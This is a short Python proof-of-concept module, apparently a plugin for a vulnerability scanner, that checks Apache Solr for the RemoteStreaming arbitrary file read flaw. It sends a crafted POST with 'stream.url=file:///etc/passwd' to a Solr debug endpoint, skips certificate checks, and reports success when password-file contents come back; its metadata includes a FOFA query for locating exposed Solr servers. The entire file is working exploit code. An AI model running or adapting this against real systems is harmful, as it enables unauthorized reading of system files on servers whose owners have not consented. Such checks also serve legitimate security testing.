#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/VMZfbUClU8I72pAzzitAOA',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Apache Solr RemoteStreaming 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="APACHE-Solr"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded'
      }
  target = '/solr/demo/debug/dump?param=ContentStreams'
  data = 'stream.url=file:///etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret